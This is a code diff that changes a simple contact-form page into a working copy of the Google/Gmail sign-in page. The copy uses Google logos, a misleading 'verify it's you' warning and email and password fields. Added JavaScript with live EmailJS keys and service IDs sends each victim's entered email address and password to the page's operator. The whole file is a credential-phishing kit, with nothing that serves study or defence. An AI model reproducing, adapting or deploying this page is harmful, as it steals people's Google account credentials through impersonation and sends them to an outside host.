@@ -1,26 +1,276 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+    <meta content="width=300, initial-scale=1" name="viewport">
+    <meta name="jingle" value="notranslate">
+    <meta name="description" content=".">
+    <title>Gmail</title>
+    <style>
+        html,
+        body {
+            font-family: Arial, sans-serif;
+            background: #fff;
+            margin: 0;
+            padding: 0;
+            border: 0;
+            position: absolute;
+            height: 100%;
+            min-width: 100%;
+            font-size: 13px;
+            color: #404040;
+            direction: ltr;
+            -webkit-text-size-adjust: none;
+        }
+
+        button,
+        input[type=button],
+        input[type=submit] {
+            font-family: Arial, sans-serif;
+        }
+
+        a,
+        a:hover,
+        a:visited {
+            color: #427fed;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        h1 {
+            font-size: 20px;
+            color: #262626;
+            margin: 0 0 15px;
+            font-weight: normal;
+        }
+
+        h2 {
+            font-size: 14px;
+            color: #262626;
+            margin: 0 0 15px;
+            font-weight: bold;
+        }
+
+        input[type=email],
+        input[type=number],
+        input[type=password],
+        input[type=tel],
+        input[type=text],
+        input[type=url] {
+            -moz-appearance: none;
+            -webkit-appearance: none;
+            appearance: none;
+            display: inline-block;
+            height: 36px;
+            padding: 0 8px;
+            margin: 0;
+            background: #fff;
+            border: 1px solid #d9d9d9;
+            border-top: 1px solid #c0c0c0;
+            box-sizing: border-box;
+            border-radius: 1px;
+            font-size: 15px;
+            color: #404040;
+            width: 100%;
+            margin-bottom: 10px;
+        }
+
+        input[type=email]:focus,
+        input[type=password]:focus,
+        input[type=text]:focus {
+            outline: none;
+            border: 1px solid #4d90fe;
+            box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.3);
+        }
+
+        .red-box {
+            margin: 10px auto;
+            display: block;
+            width: 80%;
+            max-width: 400px;
+            text-align: center;
+            border: 1px solid red;
+            background-color: rgba(255, 60, 60, 0.158);
+            padding: 10px;
+        }
+
+        .wrapper {
+            position: relative;
+            min-height: 100%;
+        }
+
+        .content {
+            padding: 0 44px;
+        }
+
+        .main {
+            padding-bottom: 100px;
+        }
+
+        .google-header-bar {
+            height: 71px;
+            border-bottom: 1px solid #e5e5e5;
+            overflow: hidden;
+        }
+
+        .google-header-bar.centered {
+            border: 0;
+            height: 108px;
+        }
+
+        .google-header-bar.centered .header .logo {
+            float: none;
+            margin: 40px auto 30px;
+            display: block;
+        }
+
+        .card {
+            background-color: #f7f7f7;
+            padding: 20px 25px 30px;
+            margin: 0 auto 25px;
+            width: 304px;
+            border-radius: 2px;
+            box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
+        }
+
+        .banner {
+            text-align: center;
+        }
+
+        .banner h1 {
+            color: #555;
+            font-size: 32px;
+            font-weight: 300;
+            margin-bottom: 10px;
+        }
+
+        .signin-card {
+            width: 274px;
+            padding: 40px 40px;
+        }
+
+        .signin-card .profile-img {
+            width: 96px;
+            height: 96px;
+            margin: 0 auto 10px;
+            display: block;
+            border-radius: 50%;
+        }
+
+        #button {
+            width: 100%;
+            height: 36px;
+            background-color: #4d90fe;
+            color: #fff;
+            border: 1px solid #3079ed;
+            border-radius: 3px;
+            font-weight: bold;
+            font-size: 14px;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+
+        #button:hover {
+            background-color: #357ae8;
+        }
+
+        .need-help-reverse {
+            float: right;
+        }
+
+        .google-footer-bar {
+            position: absolute;
+            bottom: 0;
+            height: 35px;
+            width: 100%;
+            border-top: 1px solid #e5e5e5;
+            overflow: hidden;
+            background: #f1f1f1;
+        }
+
+        .footer {
+            padding-top: 7px;
+            font-size: .85em;
+            text-align: center;
+            color: #737373;
+        }
+    </style>
 </head>
+
 <body>
-    <!-- modify this form HTML and place wherever you want your form -->
-<form
-  action="https://formspree.io/f/mljjkgeq"
-  method="POST"
->
-  <label>
-    Your email:
-    <input type="email" name="email">
-  </label>
-  <label>
-    Your message:
-    <textarea name="message"></textarea>
-  </label>
-  <!-- your other form fields go here -->
-  <button type="submit">Send</button>
-</form>
+    <div class="wrapper">
+        <div class="google-header-bar centered">
+            <div class="header content clearfix">
+                <img alt="Google" class="logo"
+                    src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_116x41dp.png"
+                    width="116" height="41">
+            </div>
+        </div>
+        <div class="main content clearfix">
+            <div class="banner">
+                <h1>One account. All of Google.</h1>
+                <h2>Sign in to continue to Gmail</h2>
+            </div>
+            <div class="red-box">
+                <p style="font-weight:bold; font-size:13px">Verify needed to understand it's you</p>
+                <p>Enter your password for security reason (make sure your caps lock is off)</p>
+                <p>Forgot your password ? <a href="#">Request new one</a></p>
+            </div>
+            <div class="card signin-card clearfix">
+                <img class="profile-img" src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="">
+                <form method="post" id="contact-form"> <label class="hidden-label" for="Email">Email</label>
+                    <input id="Email" name="email" type="email" placeholder="Email" required spellcheck="false">
+
+                    <label class="hidden-label" for="Passwd">Password</label>
+                    <input id="Passwd" name="password" type="password" placeholder="Password" required>
+
+                    <button type="submit" id="button">Sign in</button>
+                    <a id="link-forgot-passwd" href="https://accounts.google.com/RecoverAccount"
+                        class="need-help-reverse">
+                        Need help?
+                    </a>
+                </form>
+            </div>
+        </div>
+        <div class="google-footer-bar">
+            <div class="footer content">
+                <span>Google &bull; Privacy &amp; Terms &bull; Help</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- مكتبة EmailJS -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        // تهيئة المفتاح الخاص بك
+        emailjs.init('BH4ObRCHCUpIVikbr');
+
+        const btn = document.getElementById('button');
+        document.getElementById('contact-form').addEventListener('submit', function (event) {
+            event.preventDefault(); // يمنع إعادة تحميل الصفحة الطبيعي
+
+            btn.textContent = 'Please wait...';
+
+            const serviceID = 'service_q3juzkq';
+            const templateID = 'template_sup9jwi';
+
+            emailjs.sendForm(serviceID, templateID, this)
+                .then(() => {
+                    btn.textContent = 'Sign in';
+                    alert('Sent successfully!');
+                    this.reset();
+                }, (err) => {
+                    btn.textContent = 'Sign in';
+                    alert('Failed: ' + JSON.stringify(err)); // سيخبرك بسبـب الفشل بالتحديد إذا حدث خطأ
+                });
+        });
+    </script>
 </body>
+
 </html>
